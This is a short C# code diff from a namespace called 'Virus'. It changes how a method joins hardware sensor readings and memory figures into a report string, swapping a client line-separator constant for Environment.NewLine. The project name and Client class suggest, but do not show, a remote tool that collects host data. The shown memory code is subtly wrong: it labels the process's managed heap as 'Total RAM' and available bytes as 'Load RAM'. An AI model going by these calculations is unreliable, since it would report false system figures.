@@ -22,7 +22,7 @@ namespace Virus {
                 {
                     string data = computer.Hardware[i].Sensors[j].SensorType + " " + computer.Hardware[i].Sensors[j].Name;
                     data += ":" + computer.Hardware[i].Sensors[j].Value.ToString();
-                    result += data + Client.LINE_SEPERATOR;
+                    result += data + Environment.NewLine;
                 }
             }
             computer.Close();
@@ -30,7 +30,7 @@ namespace Virus {
             result += "Total RAM:" + (GC.GetTotalMemory(false) / 100);
 
             float memory = new PerformanceCounter("Memory", "Available Bytes", null).RawValue / 1000000;
-            result += Client.LINE_SEPERATOR + "Load RAM:" + (int) (memory);
+            result += Environment.NewLine + "Load RAM:" + (int) (memory);
 
             return result;
         }
